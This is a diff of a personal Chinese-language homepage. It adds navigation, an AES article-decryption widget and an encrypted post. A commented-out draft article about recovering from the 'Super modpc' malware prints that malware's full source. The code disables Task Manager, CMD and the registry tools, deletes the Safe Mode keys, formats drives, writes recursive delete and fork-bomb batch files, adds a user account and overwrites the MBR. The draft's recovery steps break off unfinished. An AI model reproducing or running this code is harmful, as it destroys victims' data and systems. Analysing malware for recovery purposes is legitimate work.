@@ -5,6 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="https://cdn.staticfile.net/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+  <title>VeryrrDefine的屑主页</title>
   <script src="js/jquery.min.js"></script>
   <script src="js/popper.min.js"></script>
   <script src="js/bootstrap.min.js"></script>
@@ -317,7 +318,7 @@
         <li class="nav-item dropdown">
           <a class="nav-link dropdown-toggle" data-toggle="dropdown" href="#">技术展示区</a>
           <div class="dropdown-menu">
-            <a class="dropdown-item" href="#">啊，我被封印了</a>
+            <a class="dropdown-item" href="IT/powiainaNumPJS/index.html">PowiainaNum.js</a>
           </div>
         </li>
       </ul>
@@ -327,7 +328,6 @@
     <hr>
     <h2 class="text-center">欢迎来到VeryrrDefine的主页！</h2>
     <p class="text-center" style="font-size: 16;">Welcome to VeryrrDefine's HomePage!</p>
-    <hr>
     <hr>
     </div>
     <div class="row">
@@ -354,14 +354,267 @@
             2024/06/05: 开始开发多维体积增量
           </li>
         </ul>
+        <hr>
+        <h3>文章解密</h3>
+        <p>输入密码以解密1+2+1+1篇文章</p>
+        <div class="input-group input-group-sm">
+          <input type="text" class="form-control" placeholder="输入密码" id="password2p1p1" name="password">
+          
+        </div>
+        <button class="btn btn-primary" onclick="decrypt2P1P1();">解密</button>
       </div>
       <div class="col-sm-8">
         有部分内容被AES加密了，加密/解密：https://www.sojson.com/encrypt_aes.html
         <hr>
-        <h2>How</h2>
-        <h5>2024/10/02</h5>
+        <!--<h2>如何修复被超级modpc损坏的电脑</h2>
+        <h5>2024/10/11</h5>
         <p>
-          目前我打算永久删除4个被加密的文章.
+
+          超级modpc，作者hanbao233xD基于Superwaiji开发的一个<span style="color: red">病莓</span>。<br>
+          <h4>材料准备： </h4>
+          <ul>
+            <li>2x 16G U盘</li>
+            <li>一台可以正常使用联网的电脑</li>
+          </ul>
+          <h4><span style="color: red">病莓</span>概述:</h4>
+          <button type="button" class="btn btn-primary" data-toggle="collapse"
+          data-target="#codeSuperModpc">展示源代码</button>
+          <pre id="codeSuperModpc" class="collapse">
+.版本 2
+
+.子程序 Fuck
+
+_启动窗口.可视 ＝ 假
+写注册项 (1, “.txt\”, “jpegfile”)
+写注册项 (1, “.inf\”, “jpegfile”)
+写注册项 (1, “.txt\”, “jpegfile”)
+写注册项 (1, “.word\”, “jpegfile”)
+写注册项 (1, “.pdf\”, “jpegfile”)
+' 下面copy
+写注册项 (4, “SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue”, 0)  ' 隐藏文件和文件夹
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun”, 1)  ' 隐藏开始中的运行 禁止WIN2000/XP通过任务管理器创建新任务
+写注册项 (3, “SoftWare \Microsoft \Windows \CurrentVersion \Policies\WinOldApp\Disabled”, 1)
+' 隐藏“MS-DOS方式”下的磁盘驱动器。不管是在“我的电脑”里，或“MS－DOS”方式下都看不见了
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr”, 1)
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel”, 1)  ' 禁用控制面板
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\System\Disableregistrytools”, 1)  ' 禁用注册表
+写注册项 (3, “SoftWare\Microsoft \Windows \CurrentVersion \Policies\WinOldApp\Disabled”, 1)
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives”, 4294967295)  ' 隐藏所有驱动器
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive”, 4294967295)  ' 禁止所有驱动器
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions”, 1)  ' 隐藏文件夹选项
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose”, 1)  ' 隐藏开始中的关机
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind”, 1)  ' 隐藏开始中的搜索
+写注册项 (3, “Software\Policies\Microsoft\Windows\System\DisableCMD”, 2)  ' 1 禁用CMD和.BAT文件 2 禁CMD不禁.BAT 0启用两项
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage”, 1)  ' 隐藏主页选项组
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu”, 1)  ' 隐藏IE文件菜单
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFavorites”, 1)  ' 隐藏收藏夹菜单
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoPrinting”, 1)  ' 禁用IE打印功能
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions”, 1)  ' 隐藏Internet选项
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource”, 1)  ' 禁止IE查看源文件
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Interner Settings\Zones\3\1803”, 3)  ' 禁用IE下载功能
+写注册项 (3, “Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu”, 1)  ' 禁止右键关联菜单
+写注册项 (3, “Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders”, 1)  ' 禁止修改控制面版
+' 无法进入安全模式
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{36FC9E60-C465-11CF-8056-444553540000}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E965-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E967-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E969-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96A-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E96F-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E977-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E97B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E97D-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{4D36E980-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{71A27CDD-812A-11D0-BEC7-08002BE2092F}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AppMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Base\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Boot Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Boot file system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\CryptSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\DcomLaunch\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmadmin\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmboot.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmio.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmload.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmserver\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\EventLog\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\File system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\HelpSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Netlogon\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PCI Configuration\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PlugPlay”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\PNP Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Primary disk\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\RpcSs\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\SCSI Class\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\sermouse.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\sr.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\SRService\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\System Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\vga.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\vgasave.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\WinMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{36FC9E60-C465-11CF-8056-444553540000}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E965-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E967-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E969-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96A-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E96F-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E972-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E973-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E974-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E975-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E977-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E97B-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E97D-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{4D36E980-E325-11CE-BFC1-08002BE10318}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{71A27CDD-812A-11D0-BEC7-08002BE2092F}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AFD\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AppMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Base\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Boot Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Boot file system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Browser\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\CryptSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DcomLaunch\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Dhcp\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmadmin\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmboot.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmio.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmload.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmserver\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DnsCache\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\EventLog\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\File system\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\HelpSvc\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ip6fw.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ipnat.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LanmanServer\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LanmanWorkstation\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LmHosts\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Messenger\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Netlogon\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetMan\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Network\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NetworkProvider\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\NtLmSsp\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PCI Configuration\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PlugPlay\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PNP Filter\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\PNP_TDI\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Primary disk\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpcdd.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpdd.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdpwd.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\rdsessmgr\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\RpcSs\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SCSI Class\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\sermouse.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SharedAccess\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\sr.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SRService\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Streams Drivers\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\System Bus Extender\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Tcpip\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\TDI\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\tdpipe.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\tdtcp.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\termservice\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\vga.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\vgasave.sys\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WinMgmt\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WZCSVC\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Ndisuio\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\Network\”)
+删除注册项 (4, “SYSTEM\CurrentControlSet\Control\SafeBoot\”)
+写注册项 (4, “SOFTWARE\360Safe\safemon\ExecAccess”, 1)
+写注册项 (4, “SOFTWARE\360Safe\safemon\MonAccess”, 1)
+写注册项 (4, “SOFTWARE\360Safe\safemon\SiteAccess”, 1)
+写注册项 (4, “SOFTWARE\360Safe\safemon\UDiskAccess”, 1)
+' 上面copy
+写注册项 (#现行用户, “Control Panel\desktop\MenuShowDelay”, “999”)
+写注册项 (1, “.exe\”, “jpegfile”)
+写注册项 (1, “.com\”, “jpegfile”)
+写注册项 (1, “.exefile\”, “jpegfile”)
+运行 (“format.exe d: /q /x”, 真, )
+运行 (“format.exe e: /q /x”, 真, )
+运行 (“format.exe f: /q /x”, 真, )
+运行 (“format.exe g: /q /x”, 真, )
+运行 (“format.exe h: /q /x”, 真, )
+运行 (“format.exe i: /q /x”, 真, )
+运行 (“format.exe j: /q /x”, 真, )
+运行 (“format.exe k: /q /x”, 真, )
+运行 (“format.exe l: /q /x”, 真, )  ' 不一定有用的格盘
+写到文件 (“C:\windows\temp\1.bat”, 到字节集 (“del” ＋ “ /f/s/q C:\*” ＋ #换行符 ＋ “del /f /s /q D:\*” ＋ #换行符 ＋ “del /f /s /q E:\*” ＋ #换行符 ＋ “del /f /s /q F:\”))
+写到文件 (“C:\windows\temp\2.bat”, 到字节集 (“ping 127.0.0.1” ＋ #换行符 ＋ “n” ＋ “e” ＋ “t” ＋ “ ” ＋ “us” ＋ “er” ＋ “ ” ＋ “%us” ＋ “er” ＋ “name%” ＋ “ %random%” ＋ #换行符 ＋ “n” ＋ “e” ＋ “t” ＋ “use” ＋ “r” ＋ “ nm” ＋ “sl” ＋ “劳” ＋ “资” ＋ “qq” ＋ “10001” ＋ “ %random% /add ”))
+运行 (“C:\windows\temp\1.bat”, 假, #隐藏窗口)  ' 传统模式格盘
+写到文件 (“C:\winkiller.exe”, #winkiller)  ' Winkiller
+运行 (“C:\winkiller.exe”, 假, )
+写到文件 (“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\fill.bat”, #fill)
+运行 (“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\fill.bat”, 真, #隐藏窗口)
+运行 (“C:\windows\temp\2.bat”, 假, #隐藏窗口)
+运行 (“cmd /c taskkill /f /im explorer.exe”, 假, )
+信息框 (“异常！ ”, #错误图标, , )
+信息框 (“你的电脑被破坏了，重启后将无法进入系统，如果你需要修复，请在下一个页面扫码”, #错误图标, , )
+写到文件 (“C:\mini1.exe”, #miniw)
+运行 (“C:\mini1.exe”, 假, )
+写到文件 (“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\5.bat”, 到字节集 (“shutdown -r -t 1” ＋ #换行符 ＋ “taskkill /f /im explorer.exe” ＋ #换行符 ＋ “%0|%0”))
+写到文件 (“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\6.bat”, 到字节集 (“%0|%0”))
+写到文件 (“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\12.bat”, 到字节集 (“@echo off” ＋ #换行符 ＋ “echo ^%Username%你妈死了” ＋ #换行符 ＋ “del /f /s /q C:\users\%username%\desktop\*” ＋ #换行符 ＋ “%0”))
+写到文件 (“C:\pay.exe”, #MiniPay)
+运行 (“cmd /c taskkill /f /im explorer.exe”, 假, )
+运行 (“C:\pay.exe”, 真, )
+信息框 (“提醒，不进行扫码电脑将无法进入系统”, #错误图标, , )
+运行 (“C:\pay.exe”, 真, )
+写注册项 (#所有用户, “Control Panel\Desktop\WaitToKillAppTimeout”, “1”)
+写注册项 (#所有用户, “Control Panel\Desktop\HungAppTimeout”, “100”)
+写到文件 (“C:\mbr.exe”, #mbrfuck)
+运行 (“C:\mbr.exe”, 假, )
+
+          </pre><br>
+          在触发<span style="color: red">病莓</span>后，<span style="color: red">病莓</span>会首先将txt pdf 还有exe, com文件设置为用图片预览器打开。<br>
+          同时会把D-L盘全部进行格式化，运行WinKiller(MBR+逻辑锁)，迷你世界安装程序，MBR<span style="color: red">病莓</span><br>
+    
+          <h4>解决办法:</h4>
+          1. 如果你不慎触发了此<span style="color: red">病莓</span>，无论如何请<span style="color: red">立刻断电电脑</span>，否则数据会丢失！<br>
+          2. 在一台正常使用联网的电脑上面下载linux镜像<br>
+          3. 准备一个16G U盘，安装windows PE系统<br>
+          4. 打开360系统急救箱，找到"360急救盘，急救箱WinPE版"，找到"使用360急救盘"<br>
+          5. 
+          
+        </p>
+        <hr>-->
+        <h2>你猜这么着，to <span class="redacted">[REDACTED]</span><sup>2</sup></h2>
+        <h5>2024/10/09</h5>
+        <p>
+          内容已被加密，请联系1308061599QQ获取密码<br>
+          <button type="button" class="btn btn-primary" data-toggle="collapse"
+            data-target="#encrypted20241009">展开被加密内容</button>
+        <div id="encrypted20241009" class="collapse">
+          U2FsdGVkX19e0O+ipKZ+sOJtQPlxlxmrPKps0nnGwGHjg2DumUE2hJZN47AS8MmW
+qe62vxDZBaLdR392DhfjutGm4kc+9a1n2cZtqFn/up5y6TvIvU6DVHqIHCiNLlHc
+bkpPajk7MGXuaMVwuOEwgrQkOkvRNfANxeQT5v1hKhCdQaObaZSZ9a6mhejv1LS4
+Ix4YSYgS9PWbYSW9ghKlyCr91zriaqvQlU/ewYhDRsLrd0PiYdeJe7VRJiYMk/9o
+Fs9mOG9yw5V/K74Ic8xtljgsZ7aDe/7pKCOCnRDfD0Y4rMwDzkSGEMZztIdzOa7s
+yS3/uy0tyl6Yh3mRjijI+dMKcqAhpSPekQFo1mv2T6rQ8WOw9KN7ptV/0+ec8O6o
+zL00jvISOZMkBUxD3FkvutHbogmd4l0Zr0uUw1YVs3miWjqZE61zCnfQsWeRWmSr
+EqYz7Na/iF8Uy0CrXGHNp2bw64B/v9XAaGVrfw3TgO5S0kaadQWedplJDNhorden
+D/LSrTOOvsW2cI5eOoa1l/y8MYUssgIR5VuaXS8kFczYcf27nRUzCaV93sjiSbyM
+YzibMno0TIMZmasVnDS799pgcl37IrnBN0v2OeyRntNCVjWGGDpV7C256Log4iBa
+F/AYUaGUTvezaLgO52VXlw==
+        </div>
+        <hr>
+        <h2>How</h2>
+        <h5>2024/10/02, 2024/10/09</h5>
+        <p>
+          <del>目前我打算永久删除4个被加密的文章.</del>
         </p>
         <hr>
         <h2>Just a number</h2>
@@ -692,6 +945,21 @@ Z2kY4ivyhCsUd/UOAzxR/D6pLJkV8uSKBnEs5u6Sg7bRCx+r1VEZNSpI+PvdEKaa
     
   </div>
   <script>
+    function decrypt2P1P1(){
+      var pwd = $("#password2p1p1").val();
+      var encrypted1 = $("#encrypted20240915").html().replaceAll(/\s/g, "");
+      var encrypted2 = $("#encrypted20240914").html().replaceAll(/\s/g, "");
+      var encrypted3 = $("#encrypted20240911").html().replaceAll(/\s/g, "");
+      var encrypted4 = $("#encrypted20241009").html().replaceAll(/\s/g, "");
+      $("#encrypted20240915").html(CryptoJS.AES.decrypt(encrypted1,pwd).toString(CryptoJS.enc.Utf8));
+      $("#encrypted20240914").html(CryptoJS.AES.decrypt(encrypted2,pwd).toString(CryptoJS.enc.Utf8));
+      $("#encrypted20240911").html(CryptoJS.AES.decrypt(encrypted3,pwd).toString(CryptoJS.enc.Utf8));
+      $("#encrypted20241009").html(CryptoJS.AES.decrypt(encrypted4,pwd).toString(CryptoJS.enc.Utf8));
+    }
+
+    $(document).ready(function(){
+      $('[data-toggle="tooltip"]').tooltip(); 
+    });
   </script>
 </body>
 
